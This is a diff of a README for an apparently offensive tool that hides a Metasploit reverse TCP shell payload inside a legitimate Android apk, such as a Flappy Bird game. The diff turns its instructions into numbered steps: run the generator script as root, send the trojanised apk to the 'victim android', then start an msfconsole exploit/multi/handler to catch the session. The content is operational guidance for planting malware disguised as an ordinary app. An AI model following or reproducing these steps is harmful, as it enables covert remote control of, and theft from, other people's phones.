@@ -9,9 +9,13 @@ Hide an msfconsole reverse tcp shell payload in an existing apk application, mad
   2. msfconsole (Metasploit): for starting the meterpreter session
   3. An apk file to place the payload in, e.g. an android game (search for Flappy Bird android apk)
   4. Make sure you have zipalign installed (apt install zipalign)
+  
+  
+**Step 1: Run the script (preferably as root): sudo python3 android_payload_generator.py**
 
-Once the payload is generated, send it to the victim android to run it.
-Make sure you have initialized an msfconsole session using the following commands:
+**Step 2: Once the payload is generated, send it to the victim android to run it.**
+
+**Step 3: Make sure you have initialized an msfconsole session using the following commands:**
 
 	                  msfconsole
                       use exploit/multi/handler
